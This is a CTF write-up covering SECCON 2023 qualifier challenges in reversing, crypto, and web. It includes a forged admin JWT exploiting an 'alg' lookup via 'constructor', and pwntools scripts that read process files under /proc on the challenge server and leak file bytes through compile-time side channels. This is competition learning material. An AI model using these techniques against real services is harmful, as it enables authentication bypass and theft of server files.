# SECCON CTF 2023 Qual Writeup

# About Contest

Announcement page: [https://www.seccon.jp/2023/seccon_ctf/announcement_of_seccon_ctf_2023_quals.html](https://www.seccon.jp/2023/seccon_ctf/announcement_of_seccon_ctf_2023_quals.html)

CTFtime.org: [https://ctftime.org/event/2003](https://ctftime.org/event/2003)

# Environment & Software

The main device used in M2 Macbok Air with a x86 QEMU VM using UTM. Remote WSL is also occasionally used. (A x86 notebook PC would be a **much less** painful experience.)

Softwares used include mainly Ghidra and GDB (with GEF and GEF-Extras). The remote GDB feature of the Ghidra debugger has been very helpful. Radare2 has also been used occasionally. 

# Thoughts

It is NOT a good idea to create a team because you think that “surely it is possible to just delete the team and join another one”, resulting in having to do the whole competition on a 1-person team.

# Problems

## Welcome (00:00, 50 pt, 617 teams solved)

The flag is posted one hour before the competition started in the #announcement channel of the Discord. Simply submit `SECCON{Welcome_to_SECCON_CTF_2023}` for 50 pt.

## jumpout (00:40, 84 pt, 154 teams solved)

First we load the binary into Ghidra and attempt static analysis, disassembling on demand. This goes well until we reach the code

```nasm
LAB_0010118c                                    XREF[1]:     00101206(j)  
        0010118c 48 8b 04 dc     MOV        RAX,qword ptr [RSP + RBX*0x8]
        00101190 41 83 c6 01     ADD        R14D,0x1
        00101194 41 8d 5e ff     LEA        EBX,[R14 + -0x1]
        00101198 ff e0           JMP        RAX
```

and we set a breakpoint at `0x00101198`. In `gdb` do `run <<< SECONN{dummy}` and see we successfully break at `0x00101198`. Run `stepi` to see that we are now at `0x555555555210` corresponding to `0x00101210`.

Then we try `stepi` to trace the program and `finish` to exit library functions until we reach somewhere interesting, in this case `0x001014e8`. We look at the decompile view and see a call to `strlen` and a comparison with `0x1d`. We know that the flag has length `0x1d = 29`. We can now rerun with `run <<< SECCON{aaaaaaaaaaaaaaaaaaaaa}`.

Then we continuing `stepi` and `finish` until we reach another function of interest, in this case `0x00101360`. We see that it is a function that esseentially computes

```c
uint FUN_00101360(uint param_1, uint param_2) {
  return param_1 ^ param_2 ^ 0x55 ^ ((byte *)DAT_00104010)[param_2];
}
```

We also observe there is a loop starting at `00101570` comparing the output of the function above with `byte ptr [R13 + RBX * 0x1]`, so we use `print-format --bitlen 8 --length 0x1d $r13` to extract the array, and to get `DAT_00104010` we simply choose the array in Ghidra, right click > Copy Special > Python List.

```jsx
const array1 = [0xf6, 0xf5, 0x31, 0xc8, 0x81, 0x15, 0x14, 0x68, 0xf6, 0x35, 0xe5, 0x3e, 0x82, 0x09, 0xca, 0xf1, 0x8a, 0xa9, 0xdf, 0xdf, 0x33, 0x2a, 0x6d, 0x81, 0xf5, 0xa6, 0x85, 0xdf, 0x17];
const array2 = [0xf0, 0xe4, 0x25, 0xdd, 0x9f, 0xb, 0x3c, 0x50, 0xde, 0x4, 0xca, 0x3f, 0xaf, 0x30, 0xf3, 0xc7, 0xaa, 0xb2, 0xfd, 0xef, 0x17, 0x18, 0x57, 0xb4, 0xd0, 0x8f, 0xb8, 0xf4, 0x23];

let result = "";

for (let i = 0; i < array1.length; i++) {
  result += String.fromCharCode(i ^ 0x55 ^ array1[i] ^ array2[i]);
}

console.log(result);
```

and we have the flag `SECCON{jump_table_everywhere}`.

## Bad JWT (01:47,  98 pt, 107 teams solved)

```jsx
const signature = algorithms[header.alg.toLowerCase()](data, secret);
```

is the fishy line. As `constructor` consists of only lowercase characters, we can set `alg = "constructor"`. Also `Buffer.from` ignores `'.'` characters so we can drop the one in the signature.

We simply add

```jsx
console.log(jwt.sign("constructor", { isAdmin: true }, secret));
```

to the closure passed to `app.listen`, remove the last `.` and get the flag. Thus the `session` token is

```jsx
eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ
```

and using it we obtain the flag `SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}`.

## plai_n_rsa (02:16, 78 pt, 183 team solved)

We have $e \cdot d \equiv 1 \pmod{\phi(n)}$ so $e \cdot d - 1 = k\phi(n)$. Notice $e \cdot d - 1$ is approx. 2062 bits and $\phi(n)$ should be approx. 2048 bits, so $k$ should be approx. 14 bits.

Brute forcing the small factors of $e \cdot d - 1$, we obtain the actual $\phi(n) = (p - 1)(q - 1)$. Since $n = \phi(n) + p + q -1$  and we have $hint=p+q$, we can compute $n$ and decrypt the message.

```python
from Crypto.Util.number import long_to_bytes

e = 65537
d = 15353693384417089838724462548624665131984541847837698089157240133474013117762978616666693401860905655963327632448623455383380954863892476195097282728814827543900228088193570410336161860174277615946002137912428944732371746227020712674976297289176836843640091584337495338101474604288961147324379580088173382908779460843227208627086880126290639711592345543346940221730622306467346257744243136122427524303881976859137700891744052274657401050973668524557242083584193692826433940069148960314888969312277717419260452255851900683129483765765679159138030020213831221144899328188412603141096814132194067023700444075607645059793
hint = 275283221549738046345918168846641811313380618998221352140350570432714307281165805636851656302966169945585002477544100664479545771828799856955454062819317543203364336967894150765237798162853443692451109345096413650403488959887587524671632723079836454946011490118632739774018505384238035279207770245283729785148
c = 8886475661097818039066941589615421186081120873494216719709365309402150643930242604194319283606485508450705024002429584410440203415990175581398430415621156767275792997271367757163480361466096219943197979148150607711332505026324163525477415452796059295609690271141521528116799770835194738989305897474856228866459232100638048610347607923061496926398910241473920007677045790186229028825033878826280815810993961703594770572708574523213733640930273501406675234173813473008872562157659306181281292203417508382016007143058555525203094236927290804729068748715105735023514403359232769760857994195163746288848235503985114734813

mulphi = e * d - 1
trials = [2, 2, 2, 2, 5, 7, 23, 43, 67, 1181, 7591, 7658627, 14441978113662450007]

from itertools import chain, combinations

def powerset(iterable):
    s = list(iterable)
    return chain.from_iterable(combinations(s, r) for r in range(len(s) + 1))

msg = pow(c, d, mulphi)

for i in powerset(trials):
    prod = 1
    for j in i:
        prod *= j
    if mulphi % prod != 0:
        raise Exception("Error")
    n = mulphi // prod + hint - 1
    print(long_to_bytes(pow(c, d, n)))
```

```c
$ python3 solve.py | grep SECCON
b'SECCON{thank_you_for_finding_my_n!!!_GOOD_LUCK_IN_SECCON_CTF}'
```

and thus we have the flag `SECCON{thank_you_for_finding_my_n!!!_GOOD_LUCK_IN_SECCON_CTF}`.

## readme 2023 (03:08, 104 pt, 93 team solved)

Launch the Docker container locally. Try not to make the mistake of first trying to solve the problem on an ARM64 container.

Modify the local version to print not `0x100` bytes but `0x10000` bytes.

We can see the content of the last register using `/proc/self/syscall` and we see that the offset from the beginning of memory-mapped `/home/ctf/flag.txt` is almost constant. In addition, `mmap` has `0x1000` alignment, meaning that we can almost know the filename in `/proc/self/map_files`.

Fortunately, the flag was found on the first try.

```python
from pwn import *
from time import sleep

def gen():
    yield 0
    for i in range(1, 100):
        yield i
        yield -i

for i in gen():
    try:
        # r = remote("localhost", 2023)
        r = remote("readme-2023.seccon.games", 2023)
        r.send(b"/proc/self/syscall\n")
        s = int(eval(r.readline()[6:])[-13:-1], 16)
        offset = 958339
        s += offset
        s += i * 0x1000
        s &= ~0xFFF
        t = s + 0x1000
        print(r.recv())
        r.send(f"/proc/self/map_files/{hex(s)[2:]}-{hex(t)[2:]}\n".encode("utf8"))
        print(r.recv())
        r.send(b"/nonexist")
        r.close()
        sleep(2)
    except:
        sleep(2)
```

and the flag is `SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}`.

## crabox (03:57, 132 pt, 53 team solved)

We can get 1 bit of information, whether the compile is successful or not. In theory we can do binary search on each character, but linear search in kind of good enough.

```python
from pwn import *

source = """
}

const S: &'static [u8] = include_bytes!(file!());
const _: usize = x();

const fn x() -> usize {
    if S[__ADDR__] == b'__CHAR__' {
        1
    } else {
        unreachable!()
    }
__EOF__
"""

current = "SECCON"

for i in range(0, 0x30):
    for j in "{}_abcdefghijklmnopqrstuvwxyz0123456789":
        print("Current:", current, "try:", current + j)
        payload = source.replace("__ADDR__", "0x{:04x}".format(0xDD + i)).replace(
            "__CHAR__", j
        )
        # r = remote("localhost", 1337)
        r = remote("crabox.seccon.games", 1337)
        r.send(payload.encode("utf8"))
        sleep(2)
        result = r.read().strip()
        if result[-2:] == b":)":
            current += j
            break
```

The flag is `SECCON{ctfe_i5_p0w3rful}`.

## Sickle (07:55, 106 pt, 89 team solved)

We can use [https://kaitai.io/](https://kaitai.io/) especially [http://formats.kaitai.io/python_pickle/python.html](http://formats.kaitai.io/python_pickle/python.html) to disassemble the bytecode. In addition we need it to not stop disassembling when `stop` opcode is reached and also to give us the address, so we modify the source code slightly.

```python
def _read(self):
        self.ops = []
        i = 0
        while True:
            try:
                orig_position = self._io._io.tell()
                _ = PythonPickle.Op(self._io, self, self._root)
                self.ops.append((orig_position, _))
                # if _.code == PythonPickle.Opcode.stop:
                #     break
                i += 1
            except:
                break
```

and we obtain the full bytecode like this:

```python
0: short_binunicode	"builtins"
10: short_binunicode	"getattr"
19: stack_global	
20: memoize	
21: dup	
22: short_binunicode	"builtins"
32: short_binunicode	"input"
39: stack_global	
40: short_binunicode	"FLAG> "
48: tuple1	
49: reduce
...
```

However this takes quite some time to read (at the end we will still need to read this though), so we want a higher level view. Use some hex editor to delete all the `stop` operations and use radare2 with https://github.com/doyensec/r2pickledec to get a higher level view (Python pseudocode).

Using both of them, we can run the program by hand using Excel to record the stack and memo information.

The final program to calculate the flag is as belows:

```python
xor_factor = 1244422970072434993
mod_base = 18446744073709551557
entries = [
	8215359690687096682,
	1862662588367509514,
	8350772864914849965,
	11616510986494699232,
	3711648467207374797,
	9722127090168848805,
	16780197523811627561,
	18138828537077112905,
]
inv = pow(65537, -1, mod_base - 1)

from Crypto.Util.number import long_to_bytes, bytes_to_long

arr = []

for i, num in enumerate(entries):
    ok = pow(num, inv, mod_base)
    ok = ok ^ (xor_factor if i==0 else entries[i-1])
    arr.append(long_to_bytes(ok))

print("".join(list(map(lambda x: x[::-1].decode("utf8"), arr))))
```

The flag is `SECCON{Can_someone_please_make_a_debugger_for_Pickle_bytecode??}`.

## optinimize (12:05, 152 pt, 39 team solved)

A number of failed attempts to translate the functions into C later,

```python
break P__main_u4
run
# Repeat the session below
x/2x (*(void**)($rdi + 8) + 8)
finish
x/2x (*(void**)($rax + 8) + 8)
continue
```

lets us see the input and output of `P__main_u64`. Plugging it into [https://oeis.org](https://oeis.org) we discover that it is [https://oeis.org/A001608](https://oeis.org/A001608).

Do the same thing for `Q__main_u13` but the inputs are too large, so we keep track of the inputs and outputs for use when checking whether our reimplementation of `Q__main_u13` is correct.

We will notice that the outputs of the reimplementation of `Q__main_u13` seem to be correct but the flag seems to be corrupted beyond the 9th character. Recall that `P__main_x64` calculates the Perrin number, read the Wikipedia article and notice a section called Perrin pseudoprimes, and realize that instead of the `n-th` prime we need the `n-th` prime or Perrin pseudoprime, so we simply modify the program to compensate for the number of Perrin pseudoprimes.

Speaking of reimplementation, we forced the decompiler to generate more readable code by using two functions: defining custom datatype in Data Type Manager, and using the Override Signature function. Since the source code is at [https://github.com/nim-lang/bigints/blob/38eb846a980fda6b199bbff140b32354edf9e301/src/bigints.nim](https://github.com/nim-lang/bigints/blob/38eb846a980fda6b199bbff140b32354edf9e301/src/bigints.nim) and we know the in-memory layout of `BigInt` and `seq[uint32]` ([https://forum.nim-lang.org/t/4837](https://forum.nim-lang.org/t/4837)) we can make the code much more readable, which is also the reason why we know that the `x/2x (*(void**)($rdi + 8) + 8)` command works.

There was a slightly more documented version of the program, but I seem to have destroyed it when I `rsync`ed the directory from local to remote. Seriously I will be buying another notebook PC for CTF…

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

typedef long long ll;

char BASE_N_ARRAY[] = { 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xae, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc8, 0x1a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x56, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd9, 0x6a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1b, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb6, 0x5f, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0xf7, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9e, 0xbd, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x76, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3b, 0x17, 0x5b, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb1, 0xe3, 0x6f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x25, 0xef, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5f, 0x8e, 0x85, 0x00, 0x00, 0x00, 0x00, 0x00, 0x39, 0xc6, 0x98, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf6, 0x6a, 0xad, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0xcd, 0x08, 0x8e, 0x01, 0x00, 0x00, 0x00, 0x00, 0x07, 0x61, 0xbb, 0x01, 0x00, 0x00, 0x00, 0x00, 0xf1, 0x0f, 0xf5, 0x01, 0x00, 0x00, 0x00, 0x00, 0x27, 0x63, 0x5c, 0x02, 0x00, 0x00, 0x00, 0x00, 0xb6, 0x71, 0xa9, 0x02, 0x00, 0x00, 0x00, 0x00, 0x93, 0x84, 0xd6, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xf0, 0x62, 0x03, 0x00, 0x00, 0x00, 0x00, 0xad, 0x8e, 0x78, 0x03, 0x00, 0x00, 0x00, 0x00, 0xed, 0xa8, 0xca, 0x03, 0x00, 0x00, 0x00, 0x00 };
char BASE_CS_ARRAY[] = { 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xce, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

int main() {
    ll lVar8;
    ll *N_ARRAY = (ll *)BASE_N_ARRAY;
    ll *CS_ARRAY = (ll *)BASE_CS_ARRAY;
    ll local_d8, local_b8, local_98, local_78, local_58;
    ll uVar5, uVar7;
    ll N, K, I;
    lVar8 = 0;
    while (true) {
        N = N_ARRAY[lVar8];
        K = 0;
        I = lVar8;
        local_d8 = N;
        local_b8 = local_d8;
        scanf("%lld", &local_d8);
        local_98 = local_d8;
        local_d8 = 0x100;
        local_78 = local_d8;
        local_98 %= local_78;
        local_58 = local_98;
        uVar5 = local_58;
        uVar7 = CS_ARRAY[I] ^ uVar5;
        printf("%c", (char)uVar7);
        fflush(stdout);
        if (0x26 < lVar8) {
            break;
        }
        lVar8 = lVar8 + 1;
    }
}
```

The flag is `SECCON{3b4297373223a58ccf3dc06a6102846f}`.

## Prefect Blu (20:31, 135 pt, 51 team solved)

This problem involved a bit of guesswork.

Using VLC media player and `strace` (actually Sysinternals process monitor), we can see which playlist is being played at the moment.

We notice that `00000.mpls` throughout `00047.mpls` seem to be correct, while files after those seems to be incorrect, as we know that the flag begins with `SECCON{` and inputting other characters seem to make us go to `00048.mpls` and beyond. Plus going to `00047.mpls` and clicking `CHECK` leads us to the `CORRECT` screen.

So solving this problem involves 1 hour of clicking around in VLC, seeing which button leads to `+1` and not `+49`. which reenforces that it is not idea to play CTF without any teammates. Anyway the flag is `SECCON{JWBH-58EL-QWRL-CLSW-UFRI-XUY3-YHKK-KFBV}`.
